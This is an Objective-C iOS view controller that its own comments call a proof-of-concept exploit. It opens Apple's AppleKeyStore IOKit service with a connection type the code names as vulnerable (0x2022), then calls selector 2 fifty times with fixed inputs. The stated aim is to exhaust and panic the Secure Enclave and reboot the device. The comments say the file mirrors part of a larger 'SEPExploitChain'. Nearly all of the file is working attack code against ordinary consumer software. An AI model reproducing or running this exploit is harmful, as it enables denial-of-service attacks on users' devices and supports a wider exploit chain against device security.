//
//  ViewController.m
//  SEPTest
//
//  Minimal SEP Panic PoC - matches Pan1c/SEPExploitChain.m exactly
//

#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

// Constants - must match SEPExploitChain.m
static const char *kAppleKeyStoreService = "AppleKeyStore";
static const uint32_t kVulnerableOpenType = 0x2022;
static const uint32_t kVulnerableSelector = 2;

@interface ViewController ()
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) UIButton *panicButton;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];

    // Warning label
    UILabel *warningLabel = [[UILabel alloc] init];
    warningLabel.text = @"SEP PANIC TEST\nWILL REBOOT DEVICE";
    warningLabel.font = [UIFont boldSystemFontOfSize:24];
    warningLabel.textColor = [UIColor redColor];
    warningLabel.textAlignment = NSTextAlignmentCenter;
    warningLabel.numberOfLines = 2;
    warningLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:warningLabel];

    // Panic button
    self.panicButton = [UIButton buttonWithType:UIButtonTypeSystem];
    [self.panicButton setTitle:@"TRIGGER SEP PANIC" forState:UIControlStateNormal];
    self.panicButton.titleLabel.font = [UIFont boldSystemFontOfSize:20];
    self.panicButton.backgroundColor = [UIColor redColor];
    [self.panicButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.panicButton.layer.cornerRadius = 10;
    self.panicButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.panicButton addTarget:self action:@selector(triggerSEPPanic) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.panicButton];

    // Status label
    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"Ready\n\nTarget: AppleKeyStore selector 2\nOpen type: 0x2022\nInput: {1, 0, 0, 0x10, 0, 0}\nThreshold: ~41 calls";
    self.statusLabel.font = [UIFont fontWithName:@"Menlo" size:14];
    self.statusLabel.textColor = [UIColor greenColor];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.statusLabel];

    // Layout
    [NSLayoutConstraint activateConstraints:@[
        [warningLabel.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:40],
        [warningLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],

        [self.panicButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.panicButton.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
        [self.panicButton.widthAnchor constraintEqualToConstant:250],
        [self.panicButton.heightAnchor constraintEqualToConstant:60],

        [self.statusLabel.topAnchor constraintEqualToAnchor:self.panicButton.bottomAnchor constant:40],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-20],
    ]];
}

// This is EXACTLY the same as SEPExploitChain.m triggerResourceExhaustion
- (void)triggerSEPPanic {
    self.panicButton.enabled = NO;
    self.statusLabel.text = @"Opening AppleKeyStore...";

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        // Step 1: Find AppleKeyStore service
        io_service_t service = IOServiceGetMatchingService(
            kIOMainPortDefault,
            IOServiceMatching(kAppleKeyStoreService)
        );

        if (service == IO_OBJECT_NULL) {
            [self updateStatus:@"ERROR: AppleKeyStore not found"];
            return;
        }

        // Step 2: Open with type 0x2022
        io_connect_t connection = IO_OBJECT_NULL;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), kVulnerableOpenType, &connection);
        IOObjectRelease(service);

        if (kr != KERN_SUCCESS || connection == IO_OBJECT_NULL) {
            [self updateStatus:[NSString stringWithFormat:@"ERROR: IOServiceOpen failed: 0x%x", kr]];
            return;
        }

        [self updateStatus:@"Connected. Starting SEP exhaustion..."];

        // Step 3: Call selector 2 repeatedly until SEP panics
        // EXACT same code as SEPExploitChain.m lines 202-227
        for (uint32_t i = 0; i < 50; i++) {
            uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};  // op=1, flags=0x10
            uint64_t out[1] = {0};
            uint32_t outCnt = 1;

            kr = IOConnectCallMethod(
                connection,
                2,                      // Selector 2
                scalars, 6,             // 6 scalar inputs
                NULL, 0,                // No struct input
                out, &outCnt,           // Scalar output
                NULL, NULL              // No struct output
            );

            [self updateStatus:[NSString stringWithFormat:@"Call %u/50: kr=0x%x%@",
                               i + 1, kr, (i >= 40) ? @" <-- THRESHOLD" : @""]];

            usleep(1000);  // 1ms delay
        }

        // If we get here, panic didn't occur
        IOServiceClose(connection);
        [self updateStatus:@"Completed 50 calls - no panic?"];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.panicButton.enabled = YES;
        });
    });
}

- (void)updateStatus:(NSString *)status {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = status;
    });
}

@end
